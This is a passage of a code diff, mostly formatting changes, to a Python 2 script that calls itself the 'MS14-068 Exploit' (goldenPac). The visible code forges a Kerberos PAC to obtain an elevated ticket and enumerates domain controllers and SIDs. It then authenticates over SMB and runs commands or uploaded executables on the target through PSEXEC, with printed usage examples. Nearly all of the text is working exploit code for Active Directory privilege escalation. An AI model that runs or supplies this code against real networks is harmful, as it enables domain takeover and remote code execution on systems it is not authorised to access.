         ifRelevant[0]['ad-data'] = goldenPAC
 
         encodedIfRelevant = encoder.encode(ifRelevant)
@@ -721,15 +798,16 @@ class MS14_068:
         # Key Usage 4
         # TGS-REQ KDC-REQ-BODY AuthorizationData, encrypted with
         # the TGS session key (Section 5.4.1)
-        encryptedEncodedIfRelevant = cipher.encrypt(sessionKey, 4, encodedIfRelevant, None)
+        encryptedEncodedIfRelevant = cipher.encrypt(sessionKey, 4,
+                                                    encodedIfRelevant, None)
 
         tgsReq = TGS_REQ()
         reqBody = seq_set(tgsReq, 'req-body')
 
         opts = list()
-        opts.append( constants.KDCOptions.forwardable.value )
-        opts.append( constants.KDCOptions.renewable.value )
-        opts.append( constants.KDCOptions.proxiable.value )
+        opts.append(constants.KDCOptions.forwardable.value)
+        opts.append(constants.KDCOptions.renewable.value)
+        opts.append(constants.KDCOptions.proxiable.value)
 
         reqBody['kdc-options'] = constants.encodeFlags(opts)
         seq_set(reqBody, 'sname', serverName.components_to_asn1)
@@ -739,30 +817,31 @@ class MS14_068:
 
         reqBody['till'] = KerberosTime.to_asn1(now)
         reqBody['nonce'] = random.SystemRandom().getrandbits(31)
-        seq_set_iter(reqBody, 'etype', (cipher.enctype,))
+        seq_set_iter(reqBody, 'etype', (cipher.enctype, ))
         reqBody['enc-authorization-data'] = None
         reqBody['enc-authorization-data']['etype'] = int(cipher.enctype)
-        reqBody['enc-authorization-data']['cipher'] = encryptedEncodedIfRelevant
+        reqBody['enc-authorization-data'][
+            'cipher'] = encryptedEncodedIfRelevant
 
         apReq = AP_REQ()
         apReq['pvno'] = 5
         apReq['msg-type'] = int(constants.ApplicationTagNumbers.AP_REQ.value)
 
         opts = list()
-        apReq['ap-options'] =  constants.encodeFlags(opts)
-        seq_set(apReq,'ticket', ticket.to_asn1)
+        apReq['ap-options'] = constants.encodeFlags(opts)
+        seq_set(apReq, 'ticket', ticket.to_asn1)
 
         authenticator = Authenticator()
         authenticator['authenticator-vno'] = 5
         authenticator['crealm'] = str(decodedTGT['crealm'])
 
         clientName = Principal()
-        clientName.from_asn1( decodedTGT, 'crealm', 'cname')
+        clientName.from_asn1(decodedTGT, 'crealm', 'cname')
 
         seq_set(authenticator, 'cname', clientName.components_to_asn1)
 
-        now = datetime.datetime.utcnow() 
-        authenticator['cusec'] =  now.microsecond
+        now = datetime.datetime.utcnow()
+        authenticator['cusec'] = now.microsecond
         authenticator['ctime'] = KerberosTime.to_asn1(now)
 
         encodedAuthenticator = encoder.encode(authenticator)
@@ -771,7 +850,9 @@ class MS14_068:
         # TGS-REQ PA-TGS-REQ padata AP-REQ Authenticator (includes
         # TGS authenticator subkey), encrypted with the TGS session
         # key (Section 5.5.1)
-        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7, encodedAuthenticator, None)
+        encryptedEncodedAuthenticator = cipher.encrypt(sessionKey, 7,
+                                                       encodedAuthenticator,
+                                                       None)
 
         apReq['authenticator'] = None
         apReq['authenticator']['etype'] = cipher.enctype
@@ -779,11 +860,12 @@ class MS14_068:
 
         encodedApReq = encoder.encode(apReq)
 
-        tgsReq['pvno'] =  5
+        tgsReq['pvno'] = 5
         tgsReq['msg-type'] = int(constants.ApplicationTagNumbers.TGS_REQ.value)
         tgsReq['padata'] = None
         tgsReq['padata'][0] = None
-        tgsReq['padata'][0]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
+        tgsReq['padata'][0]['padata-type'] = int(
+            constants.PreAuthenticationDataTypes.PA_TGS_REQ.value)
         tgsReq['padata'][0]['padata-value'] = encodedApReq
 
         pacRequest = KERB_PA_PAC_REQUEST()
@@ -791,7 +873,8 @@ class MS14_068:
         encodedPacRequest = encoder.encode(pacRequest)
 
         tgsReq['padata'][1] = None
-        tgsReq['padata'][1]['padata-type'] = int(constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
+        tgsReq['padata'][1]['padata-type'] = int(
+            constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value)
         tgsReq['padata'][1]['padata-value'] = encodedPacRequest
 
         message = encoder.encode(tgsReq)
@@ -799,7 +882,7 @@ class MS14_068:
         r = sendReceive(message, domain, kdcHost)
 
         # Get the session key
-        tgs = decoder.decode(r, asn1Spec = TGS_REP())[0]
+        tgs = decoder.decode(r, asn1Spec=TGS_REP())[0]
         cipherText = tgs['enc-part']['cipher']
 
         # Key Usage 8
@@ -807,10 +890,11 @@ class MS14_068:
         # key), encrypted with the TGS session key (Section 5.4.2)
         plainText = cipher.decrypt(sessionKey, 8, str(cipherText))
 
-        encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
+        encTGSRepPart = decoder.decode(plainText, asn1Spec=EncTGSRepPart())[0]
 
-        newSessionKey = Key(cipher.enctype, str(encTGSRepPart['key']['keyvalue']))
-    
+        newSessionKey = Key(cipher.enctype,
+                            str(encTGSRepPart['key']['keyvalue']))
+
         return r, cipher, sessionKey, newSessionKey
 
     def getForestSid(self):
@@ -821,7 +905,9 @@ class MS14_068:
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
 
         if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)
+            rpctransport.set_credentials(self.__username, self.__password,
+                                         self.__domain, self.__lmhash,
+                                         self.__nthash)
 
         dce = rpctransport.get_dce_rpc()
         dce.connect()
@@ -839,7 +925,9 @@ class MS14_068:
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
 
         if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)
+            rpctransport.set_credentials(self.__username, self.__password,
+                                         self.__domain, self.__lmhash,
+                                         self.__nthash)
 
         dce = rpctransport.get_dce_rpc()
         dce.connect()
@@ -848,22 +936,29 @@ class MS14_068:
         resp = hLsarOpenPolicy2(dce, MAXIMUM_ALLOWED | POLICY_LOOKUP_NAMES)
         policyHandle = resp['PolicyHandle']
 
-        resp = hLsarQueryInformationPolicy2(dce, policyHandle, POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
+        resp = hLsarQueryInformationPolicy2(
+            dce, policyHandle,
+            POLICY_INFORMATION_CLASS.PolicyAccountDomainInformation)
         dce.disconnect()
 
-        forestSid = resp['PolicyInformation']['PolicyAccountDomainInfo']['DomainSid'].formatCanonical()
-        logging.info("Forest SID: %s"% forestSid)
+        forestSid = resp['PolicyInformation']['PolicyAccountDomainInfo'][
+            'DomainSid'].formatCanonical()
+        logging.info("Forest SID: %s" % forestSid)
 
         return forestSid
 
     def getDomainControllers(self):
         logging.debug('Calling DRSDomainControllerInfo()')
 
-        stringBinding = epm.hept_map(self.__domain, MSRPC_UUID_DRSUAPI, protocol = 'ncacn_ip_tcp')
+        stringBinding = epm.hept_map(self.__domain,
+                                     MSRPC_UUID_DRSUAPI,
+                                     protocol='ncacn_ip_tcp')
 
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
         if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)
+            rpctransport.set_credentials(self.__username, self.__password,
+                                         self.__domain, self.__lmhash,
+                                         self.__nthash)
 
         dce = rpctransport.get_dce_rpc()
         dce.set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)
@@ -874,7 +969,7 @@ class MS14_068:
         request = DRSBind()
         request['puuidClientDsa'] = NTDSAPI_CLIENT_GUID
         drs = DRS_EXTENSIONS_INT()
-        drs['cb'] = len(drs) #- 4
+        drs['cb'] = len(drs)  #- 4
         drs['dwFlags'] = DRS_EXT_GETCHGREQ_V6 | DRS_EXT_GETCHGREPLY_V6 | DRS_EXT_GETCHGREQ_V8 | DRS_EXT_STRONG_ENCRYPTION
         drs['SiteObjGuid'] = NULLGUID
         drs['Pid'] = 0
@@ -886,12 +981,13 @@ class MS14_068:
         request['pextClient']['rgb'] = list(str(drs))
         resp = dce.request(request)
 
-        dcs = hDRSDomainControllerInfo(dce,  resp['phDrs'], self.__domain, 1)
+        dcs = hDRSDomainControllerInfo(dce, resp['phDrs'], self.__domain, 1)
 
         dce.disconnect()
         domainControllers = list()
         for dc in dcs['pmsgOut']['V1']['rItems']:
-            logging.debug('Found domain controller %s' % dc['DnsHostName'][:-1])
+            logging.debug('Found domain controller %s' %
+                          dc['DnsHostName'][:-1])
             domainControllers.append(dc['DnsHostName'][:-1])
 
         return domainControllers
@@ -902,26 +998,30 @@ class MS14_068:
         rpctransport = transport.DCERPCTransportFactory(stringBinding)
 
         if hasattr(rpctransport, 'set_credentials'):
-            rpctransport.set_credentials(self.__username,self.__password, self.__domain, self.__lmhash, self.__nthash)
+            rpctransport.set_credentials(self.__username, self.__password,
+                                         self.__domain, self.__lmhash,
+                                         self.__nthash)
 
         dce = rpctransport.get_dce_rpc()
         dce.connect()
         dce.bind(samr.MSRPC_UUID_SAMR)
         resp = samr.hSamrConnect(dce)
         serverHandle = resp['ServerHandle']
-        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle, self.__domain)
+        resp = samr.hSamrLookupDomainInSamServer(dce, serverHandle,
+                                                 self.__domain)
         domainId = resp['DomainId']
-        resp = samr.hSamrOpenDomain(dce, serverHandle, domainId = domainId)
+        resp = samr.hSamrOpenDomain(dce, serverHandle, domainId=domainId)
         domainHandle = resp['DomainHandle']
-        resp = samr.hSamrLookupNamesInDomain(dce, domainHandle, (self.__username,))
+        resp = samr.hSamrLookupNamesInDomain(dce, domainHandle,
+                                             (self.__username, ))
         # Let's pick the relative ID
         rid = resp['RelativeIds']['Element'][0]['Data']
-        logging.info("User SID: %s-%s"% (domainId.formatCanonical(), rid))
+        logging.info("User SID: %s-%s" % (domainId.formatCanonical(), rid))
         return domainId, rid
 
     def getOutput(self):
-	return totalOutput
-	
+        return totalOutput
+
     def exploit(self):
         if self.__kdcHost is None:
             getDCs = True
@@ -934,7 +1034,8 @@ class MS14_068:
         except Exception, e:
             # For some reason we couldn't get the forest data. No problem, we can still continue
             # Only drawback is we won't get forest admin if successful
-            logging.error('Couldn\'t get forest info (%s), continuing' % str(e))
+            logging.error('Couldn\'t get forest info (%s), continuing' %
+                          str(e))
             self.__forestSid = None
 
         if getDCs is False:
@@ -942,18 +1043,27 @@ class MS14_068:
             self.__domainControllers.append(self.__kdcHost)
         else:
             self.__domainControllers = self.getDomainControllers()
-        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+        userName = Principal(
+            self.__username,
+            type=constants.PrincipalNameType.NT_PRINCIPAL.value)
         for dc in self.__domainControllers:
             logging.info('Attacking domain controller %s' % dc)
             self.__kdcHost = dc
             exception = None
             while True:
                 try:
-                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(userName, self.__password, self.__domain,
-                                                                            self.__lmhash, self.__nthash, None,
-                                                                            self.__kdcHost, requestPAC=False)
+                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
+                        userName,
+                        self.__password,
+                        self.__domain,
+                        self.__lmhash,
+                        self.__nthash,
+                        None,
+                        self.__kdcHost,
+                        requestPAC=False)
                 except KerberosError, e:
-                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                    if e.getErrorCode(
+                    ) == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
                         # Windows XP). So, if that's the case we'll force using RC4 by converting
                         # the password to lm/nt hashes and hope for the best. If that's already
@@ -971,14 +1081,16 @@ class MS14_068:
                         break
 
                 # So, we have the TGT, now extract the new session key and finish
-                asRep = decoder.decode(tgt, asn1Spec = AS_REP())[0]
+                asRep = decoder.decode(tgt, asn1Spec=AS_REP())[0]
 
                 # If the cypher in use != RC4 there's gotta be a salt for us to use
                 salt = ''
                 if asRep['padata']:
                     for pa in asRep['padata']:
                         if pa['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
-                            etype2 = decoder.decode(str(pa['padata-value'])[2:], asn1Spec = ETYPE_INFO2_ENTRY())[0]
+                            etype2 = decoder.decode(
+                                str(pa['padata-value'])[2:],
+                                asn1Spec=ETYPE_INFO2_ENTRY())[0]
                             salt = str(etype2['salt'])
 
                 cipherText = asRep['enc-part']['cipher']
@@ -988,27 +1100,33 @@ class MS14_068:
                 # application session key), encrypted with the client key
                 # (Section 5.4.2)
                 if self.__nthash != '':
-                    key = Key(cipher.enctype,self.__nthash)
+                    key = Key(cipher.enctype, self.__nthash)
                 else:
                     key = cipher.string_to_key(self.__password, salt, None)
 
                 plainText = cipher.decrypt(key, 3, str(cipherText))
-                encASRepPart = decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
+                encASRepPart = decoder.decode(plainText,
+                                              asn1Spec=EncASRepPart())[0]
                 authTime = encASRepPart['authtime']
 
-                serverName = Principal('krbtgt/%s' % self.__domain.upper(),
-                                       type=constants.PrincipalNameType.NT_PRINCIPAL.value)
-                tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(serverName, self.__domain, self.__kdcHost, tgt,
-                                                                             cipher, sessionKey, authTime)
+                serverName = Principal(
+                    'krbtgt/%s' % self.__domain.upper(),
+                    type=constants.PrincipalNameType.NT_PRINCIPAL.value)
+                tgs, cipher, oldSessionKey, sessionKey = self.getKerberosTGS(
+                    serverName, self.__domain, self.__kdcHost, tgt, cipher,
+                    sessionKey, authTime)
 
                 # We've done what we wanted, now let's call the regular getKerberosTGS to get a new ticket for cifs
-                serverName = Principal('cifs/%s' % self.__target, type=constants.PrincipalNameType.NT_SRV_INST.value)
+                serverName = Principal(
+                    'cifs/%s' % self.__target,
+                    type=constants.PrincipalNameType.NT_SRV_INST.value)
                 try:
-                    tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(serverName, self.__domain,
-                                                                                        self.__kdcHost, tgs, cipher,
-                                                                                        sessionKey)
+                    tgsCIFS, cipher, oldSessionKeyCIFS, sessionKeyCIFS = getKerberosTGS(
+                        serverName, self.__domain, self.__kdcHost, tgs, cipher,
+                        sessionKey)
                 except KerberosError, e:
-                    if e.getErrorCode() == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
+                    if e.getErrorCode(
+                    ) == constants.ErrorCodes.KDC_ERR_ETYPE_NOSUPP.value:
                         # We might face this if the target does not support AES (most probably
                         # Windows XP). So, if that's the case we'll force using RC4 by converting
                         # the password to lm/nt hashes and hope for the best. If that's already
@@ -1050,11 +1168,18 @@ class MS14_068:
                 s = SMBConnection2('*SMBSERVER', self.__target)
             else:
                 s = SMBConnection2('*SMBSERVER', self.__targetIp)
-            s.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, TGS=TGS,
+            s.kerberosLogin(self.__username,
+                            self.__password,
+                            self.__domain,
+                            self.__lmhash,
+                            self.__nthash,
+                            TGS=TGS,
                             useCache=False)
             if self.__command != 'None':
-                executer = PSEXEC1(self.__command, self.__username, self.__domain, s, TGS, self.__copyFile)
+                executer = PSEXEC1(self.__command, self.__username,
+                                   self.__domain, s, TGS, self.__copyFile)
                 executer.run(self.__target)
+
 
 if __name__ == '__main__':
     # Init the example's logger theme
@@ -1064,9 +1189,10 @@ if __name__ == '__main__':
     try:
         import pyasn1
     except ImportError:
-         logging.critical('This module needs pyasn1 installed')
-         logging.critical('You can get it from https://pypi.python.org/pypi/pyasn1')
-         sys.exit(1)
+        logging.critical('This module needs pyasn1 installed')
+        logging.critical(
+            'You can get it from https://pypi.python.org/pypi/pyasn1')
+        sys.exit(1)
     import datetime
     from calendar import timegm
     from time import strptime
@@ -1089,30 +1215,61 @@ if __name__ == '__main__':
 
     print version.BANNER
 
-    parser = argparse.ArgumentParser(add_help=True,
-                                     description="MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the "
-                                                 "target or saves the TGT for later use.")
+    parser = argparse.ArgumentParser(
+        add_help=True,
+        description=
+        "MS14-068 Exploit. It establishes a SMBConnection and PSEXEcs the "
+        "target or saves the TGT for later use.")
 
-    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName>')
-    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
-    parser.add_argument('command', nargs='*', default=' ',
-                        help='command (or arguments if -c is used) to execute at the target (w/o path). Defaults to '
-                             'cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)')
-    parser.add_argument('-c', action='store', metavar="pathname",
-                        help='uploads the filename for later execution, arguments are passed in the command option')
-    parser.add_argument('-w', action='store', metavar="pathname",
-                        help='writes the golden ticket in CCache format into the <pathname> file')
-    parser.add_argument('-dc-ip', action='store', metavar="ip address",
-                        help='IP Address of the domain controller (needed to get the user''s SID). If ommited it use '
-                             'the domain part (FQDN) specified in the target parameter')
-    parser.add_argument('-target-ip', action='store', metavar="ip address",
-                        help='IP Address of the target host you want to attack. If ommited it will use the targetName '
-                             'parameter')
+    parser.add_argument('target',
+                        action='store',
+                        help='[[domain/]username[:password]@]<targetName>')
+    parser.add_argument('-debug',
+                        action='store_true',
+                        help='Turn DEBUG output ON')
+    parser.add_argument(
+        'command',
+        nargs='*',
+        default=' ',
+        help=
+        'command (or arguments if -c is used) to execute at the target (w/o path). Defaults to '
+        'cmd.exe. \'None\' will not execute PSEXEC (handy if you just want to save the ticket)'
+    )
+    parser.add_argument(
+        '-c',
+        action='store',
+        metavar="pathname",
+        help=
+        'uploads the filename for later execution, arguments are passed in the command option'
+    )
+    parser.add_argument(
+        '-w',
+        action='store',
+        metavar="pathname",
+        help=
+        'writes the golden ticket in CCache format into the <pathname> file')
+    parser.add_argument(
+        '-dc-ip',
+        action='store',
+        metavar="ip address",
+        help='IP Address of the domain controller (needed to get the user'
+        's SID). If ommited it use '
+        'the domain part (FQDN) specified in the target parameter')
+    parser.add_argument(
+        '-target-ip',
+        action='store',
+        metavar="ip address",
+        help=
+        'IP Address of the target host you want to attack. If ommited it will use the targetName '
+        'parameter')
 
     group = parser.add_argument_group('authentication')
 
-    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
-    if len(sys.argv)==1:
+    group.add_argument('-hashes',
+                       action="store",
+                       metavar="LMHASH:NTHASH",
+                       help='NTLM hashes, format is LMHASH:NTHASH')
+    if len(sys.argv) == 1:
         parser.print_help()
         print "\nExamples: "
         print "\tpython goldenPac domain.net/normaluser@domain-host\n"
@@ -1124,13 +1281,14 @@ if __name__ == '__main__':
         print "\tThis will upload the xxx.exe file and execute it as: xxx.exe param1 param2 paramn"
         print "\tpython goldenPac.py -c xxx.exe domain.net/normaluser:mypwd@domain-host param1 param2 paramn\n"
         sys.exit(1)
- 
+
     options = parser.parse_args()
 
     import re
-    
-    domain, username, password, address = re.compile('(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
-        options.target).groups('')
+
+    domain, username, password, address = re.compile(
+        '(?:(?:([^/@:]*)/)?([^@:]*)(?::([^@]*))?@)?(.*)').match(
+            options.target).groups('')
 
     #In case the password contains '@'
     if '@' in address:
@@ -1153,8 +1311,9 @@ if __name__ == '__main__':
     commands = ' '.join(options.command)
     if commands == ' ':
         commands = 'cmd.exe'
-    dumper = MS14_068(address, options.target_ip, username, password, domain, options.hashes, commands, options.c,
-                      options.w, options.dc_ip)
+    dumper = MS14_068(address, options.target_ip, username, password, domain,
+                      options.hashes, commands, options.c, options.w,
+                      options.dc_ip)
 
     try:
         dumper.exploit()
@@ -1162,4 +1321,3 @@ if __name__ == '__main__':
         #import traceback
         #print traceback.print_exc()
         logging.critical(str(e))
-
